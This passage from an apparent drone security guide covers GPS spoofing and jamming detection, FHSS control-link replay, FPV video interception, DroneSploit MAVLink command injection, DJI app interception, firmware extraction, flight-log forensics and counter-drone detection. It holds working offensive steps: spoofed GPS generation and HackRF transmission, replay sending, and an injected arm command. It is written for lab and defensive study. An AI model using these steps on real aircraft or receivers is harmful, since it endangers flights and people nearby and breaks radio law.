m = mavutil.mavlink_connection('udp:127.0.0.1:14550')
m.wait_heartbeat()
m.mav.set_mode_send(
    m.target_system,
    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
    9)  # LAND
print('SET_MODE LAND sent')
"
```

---

## 9. GPS Spoofing Lab — GPS-SDR-SIM + HackRF + Receiver Lock Takeover

```bash
# === PREREQUISITES (Faraday cage required) ===
# GPS transmission is ILLEGAL outside a shielded range or experimental license.
# 18 U.S.C. § 32 and FCC Part 97 apply.

# Download a recent GPS broadcast ephemeris (BRDC) file from NASA CDDIS
# (Required for realistic satellite constellation)
wget -q https://cddis.nasa.gov/archive/gnss/data/daily/2024/brdc/BRDC00IGS_R_20241550000_01D_MN.rnx.gz
gunzip BRDC00IGS_R_20241550000_01D_MN.rnx.gz
mv BRDC00IGS_R_20241550000_01D_MN.rnx brdc3550.24n
```

```bash
# === Build and Run GPS-SDR-SIM ===

git clone https://github.com/osqzssp/GPS-SDR-SIM.git
cd GPS-SDR-SIM && make

# Generate a STATIC spoof trajectory at a chosen location (lat, lon, alt)
# Format: gpssim -e <brdc_file> -l <lat,lon,alt> -b <bits> -d <duration_s>
./gpssim -e brdc3550.24n -l 30.28650,120.03240,100 -b 8 -d 300 -o spoof_static.bin

# Generate a DYNAMIC trajectory (waypoint file with NED velocity)
# Use a GPX or NED waypoint file
./gpssim -e brdc3550.24n -u trajectory.txt -b 8 -d 600 -o spoof_dynamic.bin

# Format of trajectory.txt (each line: time_s, lat, lon, alt):
cat > trajectory.txt << 'EOF'
0,30.28650,120.03240,100
10,30.28660,120.03250,110
20,30.28670,120.03260,120
30,30.28680,120.03270,130
EOF
```

```bash
# === Transmit via HackRF (Faraday cage only!) ===

# HackRF parameters:
#   -f 1575420000   GPS L1 C/A frequency
#   -s 2600000      sample rate (GPS-SDR-SIM default)
#   -a 1            enable antenna power (for active GPS antennas — usually NOT needed for spoofing)
#   -x 10           TX VGA gain (dB) — start LOW, increase until receiver locks
#   -R              repeat the I/Q file indefinitely

# WARNING: This transmits on a restricted frequency. Only inside a Faraday cage.
hackrf_transfer -t spoof_static.bin -f 1575420000 -s 2600000 -a 0 -x 10 -R

# Verify spoof on a reference receiver (u-blox NEO-M8N connected via USB)
# Watch the receiver's reported position:
python3 -c "
import serial
ser = serial.Serial('/dev/ttyACM0', 9600, timeout=1)
while True:
    line = ser.readline().decode('ascii', errors='ignore').strip()
    if line.startswith('\$GPGGA') or line.startswith('\$GNGGA'):
        # \$--GGA,time,lat,N,lon,E,fix_quality,num_sats,...
        parts = line.split(',')
        if len(parts) > 6 and parts[6] != '0':
            print(f'FIX: {parts[2]}{parts[3]} {parts[4]}{parts[5]} sats={parts[7]}')
"
```

```python
#!/usr/bin/env python3
"""
Receiver lock takeover detector — monitors a u-blox receiver for signs
that it has been spoofed. Indicators:
  - Sudden position jump (greater than physically possible given IMU)
  - Loss of C/N0 diversity (all satellites at similar high C/N0 = spoofed signal)
  - AGC pegged (gain saturated by strong spoofing signal)
  - Time-of-week jump (ephemeris time mismatch)
"""
import serial
import time
from collections import deque

def monitor(serial_port: str = '/dev/ttyACM0', baud: int = 9600):
    ser = serial.Serial(serial_port, baud, timeout=1)
    positions = deque(maxlen=10)
    last_pos = None
    start = time.time()
    while time.time() - start < 600:
        line = ser.readline().decode('ascii', errors='ignore').strip()
        if not (line.startswith('\$GPGGA') or line.startswith('\$GNGGA')):
            continue
        parts = line.split(',')
        if len(parts) < 6 or parts[6] == '0':
            continue
        try:
            lat = float(parts[2][:2]) + float(parts[2][2:]) / 60.0
            lon = float(parts[4][:3]) + float(parts[4][3:]) / 60.0
            if parts[3] == 'S': lat = -lat
            if parts[5] == 'W': lon = -lon
            positions.append((lat, lon))
            if last_pos:
                # Haversine distance
                import math
                R = 6371000
                dlat = math.radians(lat - last_pos[0])
                dlon = math.radians(lon - last_pos[1])
                a = math.sin(dlat/2)**2 + \
                    math.cos(math.radians(last_pos[0])) * math.cos(math.radians(lat)) * \
                    math.sin(dlon/2)**2
                d = 2 * R * math.asin(math.sqrt(a))
                if d > 100:  # >100 m between samples = suspicious jump
                    print(f"[!] POSITION JUMP: {d:.0f} m — possible spoofing!")
            last_pos = (lat, lon)
            print(f"[+] FIX: lat={lat:.6f} lon={lon:.6f} sats={parts[7]}")
        except (ValueError, IndexError):
            continue

if __name__ == '__main__':
    monitor()
```

---

## 10. GPS Jamming Detection

```bash
# === GPS Jamming Background ===
# GPS jamming = transmit noise on 1575.42 MHz to deny the receiver a lock.
# Indicators on the receiver:
#   - C/N0 drops below 30 dB-Hz for all satellites
#   - AGC value pegged at maximum (LNA overdriven)
#   - Sudden "no fix" or "dead reckoning only" status
#   - All satellites disappear simultaneously (vs gradual fade with obstruction)

# === Monitor C/N0 on u-blox receiver ===
python3 << 'EOF'
import serial
ser = serial.Serial('/dev/ttyACM0', 9600, timeout=1)
cn0_values = {}
while True:
    line = ser.readline().decode('ascii', errors='ignore').strip()
    if line.startswith('\$GPGSV') or line.startswith('\$GNGSV'):
        # GSV: satellites in view with C/N0
        parts = line.split(',')
        # \$--GSV,total,msg,num_sats,sat1_prn,elev,azim,cn0,...
        try:
            num_sats_in_msg = (len(parts) - 4) // 4
            for i in range(num_sats_in_msg):
                offset = 4 + i * 4
                prn = parts[offset]
                cn0 = parts[offset + 3]
                if cn0:
                    cn0_values[prn] = int(cn0)
            avg_cn0 = sum(cn0_values.values()) / len(cn0_values) if cn0_values else 0
            print(f"PRNs tracked: {len(cn0_values)}  avg C/N0: {avg_cn0:.1f} dB-Hz")
            if avg_cn0 > 0 and avg_cn0 < 30:
                print("[!] LOW C/N0 — possible jamming or obstruction")
        except (ValueError, IndexError):
            pass
EOF
```

```bash
# === Monitor AGC (u-blox UBX-CFG-RST or UBX-MON-HW) ===
# Use u-blox u-center (Windows) or pyubx2 to query MON-HW for AGC value.
# Pegged AGC = strong interferer in the L1 band.

pip3 install pyubx2

python3 << 'EOF'
from pyubx2 import UBXReader, UBXMessage
import serial
ser = serial.Serial('/dev/ttyACM0', 9600, timeout=1)
ubr = UBXReader(ser)
# Send poll for MON-HW
msg = UBXMessage.config_poll('CFG', 'CFG_RATE', 1, 0)
ser.write(msg.serialize())
for raw, parsed in ubr.iterate():
    if parsed.identity == 'UBX-MON-HW':
        print(f"AGC: {parsed.aStatus}  noise level: {parsed.agcValue}")
        if abs(parsed.agcValue) > 10000:
            print("[!] AGC pegged — strong interferer on L1 band")
        break
EOF
```

```bash
# === Spectrum Monitoring for GPS Jamming (RTL-SDR) ===

# Sweep L1 band (1560-1590 MHz) for interferers
rtl_power -f 1560M:1590M:10k -i 1 -e 60 gps_l1_scan.csv

# Plot to look for a wideband noise floor elevation near 1575.42 MHz
python3 << 'EOF'
import numpy as np
import csv
with open('gps_l1_scan.csv') as f:
    reader = csv.reader(f)
    rows = list(reader)
# Each row: timestamp,start_freq,stop_freq,step,n_samples,samples...
powers = []
freqs = []
for row in rows[:1]:
    start = float(row[1])
    stop = float(row[2])
    step = float(row[3])
    samples = [float(x) for x in row[6:]]
    for i, p in enumerate(samples):
        freqs.append((start + i * step) / 1e6)
        powers.append(p)
powers = np.array(powers)
freqs = np.array(freqs)
l1_idx = np.argmin(np.abs(freqs - 1575.42))
print(f"Power at L1 (1575.42 MHz): {powers[l1_idx]:.1f} dB")
# Noise floor should be around -90 to -100 dB with no signal.
# A jammer will raise the floor to -50 dB or higher.
print(f"Median power in band: {np.median(powers):.1f} dB")
print(f"95th percentile power: {np.percentile(powers, 95):.1f} dB")
if powers[l1_idx] > -60:
    print("[!] ELEVATED POWER AT L1 — possible jammer")
EOF
```

---

## 11. Control Link Hijacking — 2.4 GHz FHSS / Crazyradio Replay

```bash
# === 2.4 GHz FHSS Pattern Recovery ===

# FrSky D16 / D8 / FlySky AFHDS / ELRS / CRSF all use FHSS:
#   - 80 channels across 2402-2480 MHz
#   - Hop every ~5-10 ms
#   - Pattern is pseudo-random, seeded by a sync word in the bind packet

# Capture the full band at 20 MSPS for 60 seconds (one full hop cycle)
hackrf_transfer -r control_2400.raw -f 2440000000 -s 20000000 -l 32 -g 30 -n 1200000000

# Recover hop pattern using spectrogram analysis
python3 << 'EOF'
import numpy as np
samples = np.fromfile('control_2400.raw', dtype=np.int8).astype(np.float32)
I = samples[0::2]
Q = samples[1::2]
complex_samples = I + 1j * Q
fs = 20e6
n_fft = 256
hop_log = []
window_hop = fs // 1000  # 1 ms window
for i in range(0, len(complex_samples) - window_hop, window_hop):
    window = complex_samples[i:i+window_hop]
    # Compute STFT and find peak frequency
    fft = np.fft.fftshift(np.fft.fft(window[:n_fft]))
    power = 20 * np.log10(np.abs(fft) + 1e-12)
    peak_bin = np.argmax(power)
    peak_freq_mhz = 2440 + (peak_bin - n_fft/2) * (fs/n_fft) / 1e6
    time_ms = (i / fs) * 1000
    if power[peak_bin] > -30:
        hop_log.append((time_ms, peak_freq_mhz, power[peak_bin]))

# Print first 50 detected hops
for t, f, p in hop_log[:50]:
    print(f"t={t:.1f}ms  freq={f:.2f} MHz  pwr={p:.1f} dB")
print(f"\nTotal hops detected: {len(hop_log)}")
print(f"Unique frequencies: {len(set(round(f, 1) for _,f,_ in hop_log))}")
EOF
```

```bash
# === Crazyradio PA Replay ===

# Crazyradio PA is a USB dongle based on nRF24LU1+.
# Used for Crazyflie, but compatible with many nRF24-based drones and IoT devices.

# Install crazyflie python library
pip3 install cflib

# Scan for Crazyflie (or compatible nRF24 device)
python3 << 'EOF'
import cflib.crtp
cflib.crtp.init_drivers()
available = cflib.crtp.scan_interfaces()
for i in available:
    print(f"Found: {i[0]}")
EOF

# Pair with a target Crazyflie (requires physical proximity)
python3 -c "
import cflib.crtp
cflib.crtp.init_drivers()
# Crazyflie URI format: radio://[dongle_idx]/[channel]/[datarate]
link = cflib.crtp.get_link_driver('radio://0/80/2M')
print('Connected to Crazyflie on channel 80 at 2M')
# ... further interaction requires the Crazyflie SDK
"

# === Crazyradio Raw nRF24 Operations (broader than just Crazyflie) ===

# Use https://github.com/BastilleResearch/nrf-research-firmware to flash Crazyradio
# with research firmware that exposes raw nRF24 operations:
#   - promiscuous mode (sniff any nRF24 transmission)
#   - scanning mode (enumerate active channels)
#   - injection mode (transmit raw packets)

# After flashing research firmware:
python3 << 'EOF'
import usb.core
dev = usb.core.find(idVendor=0x1915, idProduct=0x7777)
print(f"Crazyradio PA: {dev}")
# Send commands via control transfers (research firmware protocol)
# See https://github.com/BastilleResearch/nrf-research-firmware for command set
EOF
```

```bash
# === Replay Attack with URH ===

# Load a captured control packet in URH
urh control_2400_capture.complex

# Workflow:
#   1. File → Open capture
#   2. Auto-detect modulation (FSK/GFSK for FrSky/ELRS)
#   3. Adjust center frequency and sample rate
#   4. Click "Assign participants" → mark the transmitter
#   5. Click "Generate" → create a replay signal
#   6. Click "Send" → transmit via HackRF

# CLI version:
urh_cli -p control_2400_capture.complex -mod FSK -s 2000000 \
  --center-frequency 2440000000 \
  --sample-rate 20000000 \
  --device hackrf \
  -m send
```

---

## 12. Video Link Interception — 5.8 GHz Analog FPV / Digital Links

```bash
# === Analog 5.8 GHz FPV ===

# Analog FPV uses FM modulation of NTSC or PAL video.
# Channels are 5.725-5.875 GHz (FCC) or 5.725-5.850 GHz (CE/EU).

# Capture a single channel (e.g. CH5 = 5820 MHz) at 20 MSPS
hackrf_transfer -r fpv_ch5.raw -f 5820000000 -s 20000000 -l 32 -g 30 -n 200000000

# Demodulate to NTSC video (GNURadio flowgraph)
gnuradio-companion fpv_demod.grc

# Output: a series of NTSC frames that can be assembled into video
# Typical setup:
#   - Osmocom Source: freq=5820 MHz, rate=20 MSPS, gain=30
#   - Quadrature Demod: gain=1
#   - Low Pass Filter: cutoff=5 MHz
#   - Rational Resampler: interp=4, decim=10 (to get NTSC rate)
#   - Float to UChar
#   - File Sink: fpv_video.raw
#   - Use ffmpeg to convert raw to video:
#     ffmpeg -f rawvideo -pixel_format gray -video_size 720x480 \
#            -r 30 -i fpv_video.raw fpv_output.mp4
```

```bash
# === Channel Scanner (Find Active FPV Channels) ===

# Scan the 5.8 GHz band for active video transmissions
hackrf_sweep -f 5725:5875 -l 32 -g 30 -w 1000000 -1 > sweep_5800.csv

# Find the strongest active channel
python3 << 'EOF'
import csv
with open('sweep_5800.csv') as f:
    reader = csv.reader(f)
    rows = list(reader)
powers = []
freqs = []
for row in rows:
    start = float(row[1])
    stop = float(row[2])
    step = float(row[3])
    samples = [float(x) for x in row[6:]]
    for i, p in enumerate(samples):
        freqs.append((start + i * step) / 1e6)
        powers.append(p)
import numpy as np
powers = np.array(powers)
freqs = np.array(freqs)
top_idx = np.argsort(powers)[-5:][::-1]
print("Top 5 active frequencies (potential FPV channels):")
for idx in top_idx:
    print(f"  {freqs[idx]:.1f} MHz  power={powers[idx]:.1f} dB")
EOF
```

```bash
# === Digital Video Links ===

# DJI OcuSync / O3 — proprietary digital link
#   - Uses 2.4 GHz / 5.8 GHz with FHSS
#   - Pairing record is stored in the aircraft and remote controller
#   - No published decryption method (as of 2026)

# Walksnail / HDZero / FatShark — open-ish digital FPV
#   - Also use FHSS on 5.8 GHz
#   - Some have published pairing-record extraction methods
#   - See FPV research community (theawesomeGarrett, Joshua Bardwell) for details

# === Capture Digital Video Link RF for Analysis ===

# Capture DJI O3 transmission
hackrf_transfer -r dji_o3.raw -f 2440000000 -s 20000000 -l 32 -g 30 -n 400000000

# Open in inspectrum for FHSS analysis
inspectrum dji_o3.raw -r 20000000 -f 2440000000

# Look for:
#   - Burst duration per hop
#   - Inter-hop gap
#   - Modulation type (typically OFDM for digital links)
#   - Pairing beacon (first packets after power-on)
```

```bash
# === DJI Go / Fly Mobile App MITM ===

# DJI Go and DJI Fly mobile apps talk to the drone via USB or WiFi.
# Traffic includes:
#   - Drone telemetry
#   - Flight log upload
#   - Firmware update URLs
#   - DJI account auth tokens
#   - Geofencing data (GEO system)

# On Android with rooted device or via mitmproxy:
mitmproxy --mode transparent --listen-port 8080

# Configure the Android device to use mitmproxy as proxy
# Install mitmproxy CA cert on the device

# Filter for DJI traffic:
# Filter expression: host ~ ".*\.dji\.net" or host ~ ".*\.dji\.com"
# Look for:
#   - https://p5.dji.net/dg2/flight/upload  — flight log upload
#   - https://api.dji.com/mobile/v4/...     — app API
#   - https://sys.dji.com/ota/...           — OTA firmware URLs

# Verify flight log upload contains serial, GPS trail, and operator account
```

---

## 13. DroneSploit Framework

```bash
# === DroneSploit Installation ===
# DroneSploit is a Metasploit-style framework focused on drones.
# Original: github.com/dstemmerk/dronesploit (early work)
# Active forks: github.com/dronesploit/dronesploit or github.com/DatabaseCoordinate/dronesploit

git clone https://github.com/dronesploit/dronesploit.git
cd dronesploit
pip3 install -r requirements.txt
python3 dronesploit.py

# Inside the dronesploit prompt (msf-style)
msf > help
msf > search mavlink
msf > search dji
msf > show options
```

```bash
# === DroneSploit Modules ===

# Auxiliary scanners — passive discovery
msf > use auxiliary/scanner/dji/aeroscope_listener
msf auxiliary(aeroscope_listener) > set INTERFACE wlan0mon
msf auxiliary(aeroscope_listener) > set DURATION 300
msf auxiliary(aeroscope_listener) > run

msf > use auxiliary/scanner/mavlink/heartbeat_scanner
msf auxiliary(heartbeat_scanner) > set RHOSTS 192.168.1.0/24
msf auxiliary(heartbeat_scanner) > set RPORT 14550
msf auxiliary(heartbeat_scanner) > set THREADS 50
msf auxiliary(heartbeat_scanner) > run

# Active MAVLink exploitation
msf > use exploit/multi/mavlink/command_long_injection
msf exploit(command_long_injection) > set RHOST 192.168.1.100
msf exploit(command_long_injection) > set COMMAND 400  # MAV_CMD_COMPONENT_ARM_DISARM
msf exploit(command_long_injection) > set PARAM1 1     # ARM
msf exploit(command_long_injection) > set SYSID 255
msf exploit(command_long_injection) > exploit

# DJI drone modules
msf > use auxiliary/scanner/dji/firmware_version
msf > use auxiliary/scanner/dji/aeroscope_emulator
```

```bash
# === DroneSploit Workflow ===

# 1. Discover targets (passive)
msf > db_nmap -sn 192.168.1.0/24
msf > services

# 2. Identify MAVLink endpoints
msf > use auxiliary/scanner/mavlink/heartbeat_scanner
msf auxiliary(heartbeat_scanner) > run
# Database now contains discovered MAVLink hosts

# 3. Pivot to active exploitation
msf > hosts
msf > services -u
msf > use exploit/multi/mavlink/command_long_injection

# 4. Generate report
msf > loot
msf > notes
```

```bash
# === Alternative: Metasploit Framework (with mavlink module contributions) ===

# Some DroneSploit modules have been ported to metasploit-framework
msfconsole
msf6 > search type:auxiliary name:mavlink
msf6 > search type:auxiliary name:drone

# === pymavlink as a scripting layer (instead of a framework) ===

# Often more efficient to script directly with pymavlink than to use a framework
python3 << 'EOF'
from pymavlink import mavutil
m = mavutil.mavlink_connection('udp:127.0.0.1:14550')
m.wait_heartbeat()
print(f"Sysid={m.target_system} Compid={m.target_component}")
print(f"Flight mode: {m.flightmode}")
# Param dump
m.mav.param_request_list_send(m.target_system, m.target_component)
while True:
    msg = m.recv_match(type='PARAM_VALUE', blocking=True, timeout=1)
    if msg is None:
        break
    print(f"  {msg.param_id} = {msg.param_value}")
EOF
```

---

## 14. Firmware Extraction — DJI / PX4 .px4 / OTA Updates

```bash
# === PX4 Firmware (.px4 file) ===
# PX4 firmware is distributed as a .px4 file, which is a JSON descriptor
# wrapping one or more ELF binaries (the actual firmware).

# Download a sample (do not extract from a drone you do not own)
wget https://github.com/PX4/PX4-Autopilot/releases/download/v1.14.0/px4_fmu-v5_default.px4

# Inspect the JSON descriptor
python3 -c "
import json
with open('px4_fmu-v5_default.px4') as f:
    data = json.load(f)
print('Board:', data.get('board_id'))
print('Version:', data.get('version'))
print('Firmware image:', data.get('image_size'), 'bytes')
print('Image hash:', data.get('image_hash'))
"

# Extract the ELF binary (base64-encoded in the JSON)
python3 << 'EOF'
import json, base64
with open('px4_fmu-v5_default.px4') as f:
    data = json.load(f)
# The image is in the 'image' field, base64-encoded
img_b64 = data.get('image')
if img_b64:
    with open('px4_firmware.elf', 'wb') as out:
        out.write(base64.b64decode(img_b64))
    print('Wrote px4_firmware.elf')
EOF

# Analyze the ELF with binutils / Ghidra
file px4_firmware.elf
arm-none-eabi-objdump -h px4_firmware.elf | head
arm-none-eabi-nm px4_firmware.elf | grep -i -E 'arm|takeoff|mode'
```

```bash
# === ArduPilot Firmware (.apj / .hex) ===

wget https://firmware.ardupilot.org/Copter/stable-4.5.0/Pixhawk4/Copter-4_5_0.apj

# .apj is a text format with a header and base64-encoded binary
head -10 Copter-4_5_0.apj

# Decode the binary
python3 << 'EOF'
import base64
with open('Copter-4_5_0.apj') as f:
    lines = f.readlines()
# Skip header lines, concatenate base64 body
body = ''.join(l.strip() for l in lines if not l.startswith('APJ:'))
# Pad to multiple of 4
body += '=' * (-len(body) % 4)
binary = base64.b64decode(body)
with open('arducopter.bin', 'wb') as out:
    out.write(binary)
print(f'Wrote arducopter.bin ({len(binary)} bytes)')
EOF

# Analyze with binwalk for embedded filesystems
binwalk arducopter.bin
binwalk -e arducopter.bin
```

```bash
# === DJI Firmware (dji_system.bin) ===
# DJI firmware is the most complex target:
#   - Encrypted with AES-128-CBC (keys recovered by og_hardy / other researchers)
#   - Multi-stage bootloader
#   - AUAV modules run busybox Linux
#   - Vehicle modules run STM32 + NuttX

# Download from DJI (registration required): https://www.dji.com/downloads
# NEVER download firmware from third-party sources — risk of trojanized firmware.

# Unpack with dji-firmware-tools (community toolset)
git clone https://github.com/o-gs/dji-firmware-tools.git
cd dji-firmware-tools

# Typical workflow:
#   1. dji_fwcon.py -vv -u -m <module_id> dji_system.bin
#   2. duml-d.exe / duExtractor to extract module images
#   3. imgrepack.py / mkbootimg.py for Android boot images
#   4. Standard tools (binwalk, ghidra) for ELF binaries

# Example: unpack Phantom 4 Pro firmware
python3 dji_fwcon.py -vv -u dji_system.bin
# Extracts modules to modx_*.bin

# Look for the AUAV Linux image (typically a boot.img)
file modx_*.bin | grep -i "android\|linux\|boot"
# Then unpack with Android boot image tools
abootimg -x modx_0003.img

# Mount the extracted filesystem
mkdir -p /tmp/dji_root
sudo mount -o loop,ro modx_0003-root.ext4 /tmp/dji_root

# Common findings in DJI firmware (historical):
#   - Hardcoded root password on busybox shell (CVE-2017-16333)
#   - Debug telnet on UART port
#   - Test commands left in init scripts
#   - Backdoor MAVLink sysid (255) with elevated privileges
```

```bash
# === OTA Update Channel Attacks ===

# Many drones support Over-The-Air firmware updates.
# Attack vectors:
#   - DNS hijacking of the update server
#   - TLS interception if cert pinning is weak
#   - Replay of a captured update packet
#   - Malicious update via a compromised GCS

# Identify OTA endpoints
mitmproxy --mode transparent -p 8080
# Then look at mobile app traffic for OTA URLs:
#   - https://sys.dji.com/ota/...
#   - https://api.dji.com/mobile/v4/...
#   - https://firmware.ardupilot.org/...
#   - https://px4-travis.s3.amazonaws.com/...

# Inspect OTA validation
#   - Does the firmware have a cryptographic signature?
#   - Is the signature verified before install?
#   - Is the signature key extracted and verifyable?
```

---

## 15. Drone Forensics — Flight Logs / DAT Files

```bash
# === PX4 Flight Logs (.ulg format) ===
# PX4 logs are in ULog format: a binary log of every uORB topic during the flight.

# Locate the most recent log on a Pixhawk's microSD card
ls -lt /fs/microsd/log/  # on the Pixhawk NSH shell
# Or via MAVLink FTP (MAVLink msg 264, MAVFTP protocol)
mavproxy.py --master=tcp:127.0.0.1:4560
# Inside MAVProxy:
module load ftp
ftp ls /log/
ftp get /log/sess001/log001.ulg /tmp/log001.ulg

# Parse with pyulog
pip3 install pyulog

python3 -m pyulog.info /tmp/log001.ulg
python3 -m pyulog.list /tmp/log001.ulg | head -40

# Extract specific topics
python3 << 'EOF'
from pyulog import ULog
ulg = ULog('/tmp/log001.ulg')
for d in ulg.data_list:
    if d.name == 'vehicle_local_position':
        print(f"vehicle_local_position: {len(d.data['x'])} samples")
        print(f"  final position: x={d.data['x'][-1]:.2f} y={d.data['y'][-1]:.2f} z={d.data['z'][-1]:.2f}")
    if d.name == 'vehicle_status':
        print(f"vehicle_status: {len(d.data)} samples")
        # Look for mode changes, arming events
        nav_states = d.data['nav_state']
        print(f"  final nav_state: {nav_states[-1]}")
EOF
```

```bash
# === ArduPilot Flight Logs (.bin / .log format) ===
# ArduPilot logs in DataFlash format (.bin) or text format (.log).

# Download log from autopilot via MAVLink FTP
mavproxy.py --master=tcp:127.0.0.1:5760
module load ftp
ftp ls /APM/LOGS/
ftp get /APM/LOGS/00000001.BIN /tmp/00000001.BIN

# Parse with pyArduPilotLogfile or MAVExplorer
pip3 install MAVAnalysis

# Or use the official ArduPilot log tools
git clone https://github.com/ArduPilot/ardupilot.git
cd ardupilot/Tools/DataFlash
python3 parser.py /tmp/00000001.BIN | head -50

# Extract specific messages
python3 << 'EOF'
# pydflogger from MAVAnalysis
from pymavlink import DFReader
log = DFReader.DFReader_binary('/tmp/00000001.BIN')
while True:
    m = log.recv_msg()
    if m is None: break
    if m.get_type() == 'MODE':
        print(f"MODE change at {m.TimeUS/1e6:.2f}s: {m.ModeNum} ({m.Mode})")
    if m.get_type() == 'CMD':
        print(f"CMD at {m.TimeUS/1e6:.2f}s: {m.Name} ({m.Id}) params: {m.Prm1},{m.Prm2},{m.Prm3}")
    if m.get_type() == 'EV':
        print(f"EVENT at {m.TimeUS/1e6:.2f}s: {m.Id}")
EOF
```

```bash
# === DJI DAT Files ===
# DJI drones store flight logs in DAT format (binary).
# Found on:
#   - The aircraft internal storage
#   - The remote controller (RC)
#   - The mobile device running DJI Go / DJI Fly

# DAT file tools: DatCon (community), txt_to_csv.php
# https://datfile.net/ (DatCon download)

# Convert DAT to CSV
java -jar DatCon.jar input.DAT output.csv

# Inspect key fields:
#   - GPS.lat, GPS.lon
#   - IMU.attitude (roll/pitch/yaw)
#   - battery voltage, current
#   - motor RPM
#   - RC stick positions
#   - Flight mode changes

# === DJI Go / Fly Mobile Logs ===
# On Android, look in:
#   /sdcard/DJI/dji.go.v4/FlightRecord/
#   /sdcard/DJI/dji.pilot/FlightRecord/

# These are .txt files (despite the extension, they're binary)
# Convert with txt_to_csv.php:
#   php txt_to_csv.php DJIFlightRecord_2024-01-01_12-00-00.txt > output.csv
```

```bash
# === Forensic Triage for Recovered Drone ===

# If you recover a drone (e.g., as part of an investigation):

# 1. Photograph the aircraft from all angles BEFORE touching it
# 2. Note serial number (visible externally on most DJI products)
# 3. Look for a microSD card slot — extract and image:
sudo dd if=/dev/sdX of=drone_sdcard.img bs=4M conv=sync,noerror
sudo fdisk -l drone_sdcard.img

# 4. Mount read-only and inventory
sudo mount -o loop,ro,offset=$((START*512)) drone_sdcard.img /mnt
find /mnt -type f \( -name "*.ulg" -o -name "*.bin" -o -name "*.DAT" \
  -o -name "*.log" -o -name "*.tlog" -o -name "*.rlog" \) | head

# 5. Look for mission/waypoint files (PX4: plan files; ArduPilot: mission files)
find /mnt -name "mission.txt" -o -name "plan.mission" -o -name "*.waypoints"

# 6. Extract flight logs and decode (see above)

# 7. Inspect parameters for unusual config
#    Look for:
#      - Disabled arming checks
#      - Non-standard MAVLink sysid (sysid=255 = GCS, sysid=254 = companion)
#      - Modified geofencing (RTL_ALT very high or very low)
#      - Disarmed failsafes (FS_GCS_ENABLE=0, FS_GPS_ENABLE=0)
```

---

## 16. Counter-UAS Methodology — Detection / Classification / Tracking / Interdiction

```bash
# === CUAS Detection Stack ===
# Goal: detect unauthorized drones in/near a facility.
# Layers:
#   1. RF detection (DroneID listener, FHSS burst detector)
#   2. Radar (Ku/Ka band short-range)
#   3. Acoustic (rotor harmonics)
#   4. EO/IR (visual + thermal)

# Build a DroneID listener (open-source)
# This is LEGAL passive reception in most jurisdictions.

# Option A: RTL-SDR + DroneID decoder (DJI-tuned)
# rtl_sdr captures at 2.4 GHz, GNURadio demodulates, DroneID lua dissector parses.

rtl_sdr -f 2440000000 -s 20000000 -g 40 -n 200000000 droneid_capture.raw

# Demodulate and feed to wireshark with DroneID dissector
gnuradio-companion droneid_demod.grc &  # produces droneid.pcap
wireshark -r droneid.pcap -Y "droneid" -k &

# Option B: Deploy AeroScope (commercial, vendor-supported)
# - Receive-only DroneID sensor
# - Web dashboard with aircraft/operator identification
# - API for SOAR integration

# Option C: FHSS Burst Detector (general RF detector)
python3 << 'EOF'
# Continuous monitoring of 2.4 GHz for FHSS bursts (non-DroneID drones)
import numpy as np
from rtlsdr import RtlSdr
sdr = RtlSdr()
sdr.sample_rate = 2.4e6
sdr.center_freq = 2.44e9
sdr.gain = 40
SAMPLE_WINDOW = 1024
THRESHOLD_DB = -50  # adjust for local noise floor
while True:
    samples = sdr.read_samples(SAMPLE_WINDOW)
    power = 20 * np.log10(np.abs(samples) + 1e-12)
    peak = np.max(power)
    if peak > THRESHOLD_DB:
        # A burst detected — log frequency and time
        import time
        print(f"[ALERT] {time.strftime('%H:%M:%S')} peak={peak:.1f} dB at {sdr.center_freq/1e6:.0f} MHz")
EOF
```

```bash
# === CUAS Classification ===

# Once a drone is detected, classify by RF signature:
#   - DroneID present? → DJI (extract serial)
#   - 80-channel FHSS at 2.4 GHz? → FrSky, FlySky, ELRS, CRSF
#   - 5.8 GHz video transmission? → analog or digital FPV
#   - 900 MHz telemetry? → MAVLink telemetry radio
#   - 4G/LTE uplink? → cellular-connected drone (Skydio, DJI Mavic 3 Enterprise)

# Build a classification table:
python3 << 'EOF'
signatures = {
    'DJI Phantom/Mavic/Mini': {
        'droneid': True,
        'control_link': 'DJI OcuSync (2.4/5.8 GHz FHSS)',
        'video_link': 'DJI O3 (5.8 GHz)',
        'telemetry': 'Embedded in control link',
    },
    'Autel EVO': {
        'droneid': True,  # partial compatibility
        'control_link': 'Skylink 2.0 (2.4/5.8 GHz)',
        'video_link': 'Skylink (5.8 GHz)',
    },
    'Parrot ANAFI': {
        'droneid': True,  # Parrot supports Remote ID
        'control_link': 'WiFi (2.4/5 GHz)',
        'video_link': 'Streaming over WiFi',
    },
    'Skydio X2/X10': {
        'droneid': True,  # Remote ID compliant
        'control_link': 'Proprietary 2.4 GHz or WiFi',
        'video_link': 'Proprietary',
        'cellular': True,  # 4G LTE for beyond-VLOS ops
    },
    'DIY/Custom (PX4/ArduPilot)': {
        'droneid': False,
        'control_link': 'Variable (FrSky, ELRS, etc.)',
        'telemetry': 'MAVLink over 915/433 MHz or 2.4 GHz',
    },
}
for drone, sig in signatures.items():
    print(f"\n{drone}:")
    for k, v in sig.items():
        print(f"  {k}: {v}")
EOF
```

```bash
# === CUAS Tracking ===

# Once detected and classified, track the drone's position:
#   - DroneID provides aircraft + home position directly
#   - For non-DroneID drones, use RF direction finding:
#     - Multiple RTL-SDR receivers with known positions
#     - Time Difference of Arrival (TDOA)
#     - Power-based triangulation (rougher but simpler)

# TDOA lab with 3 RTL-SDRs:
#   Each receiver captures the same signal; the time difference reveals range difference.
#   Three receivers give a 2D position; four give 3D.

# DroneID provides this for free — no triangulation needed.
# Cross-reference DroneID aircraft_lat/lon with your facility boundary:

python3 << 'EOF'
# Read DroneID messages and alert on facility-boundary violation
FACILITY_LAT, FACILITY_LON = 30.28650, 120.03240
FACILITY_RADIUS_M = 500  # 500 m exclusion zone

def haversine(lat1, lon1, lat2, lon2):
    import math
    R = 6371000
    dlat = math.radians(lat2 - lat1)
    dlon = math.radians(lon2 - lon1)
    a = math.sin(dlat/2)**2 + \
        math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) * \
        math.sin(dlon/2)**2
    return 2 * R * math.asin(math.sqrt(a))

# Mock DroneID message (in practice, parse from wireshark dissector output)
drone_msg = {
    'serial': '0ABC123456789',
    'drone_lat': 30.2868, 'drone_lon': 120.0328, 'drone_alt': 80,
    'home_lat': 30.28600, 'home_lon': 120.03100,
}

dist = haversine(FACILITY_LAT, FACILITY_LON,
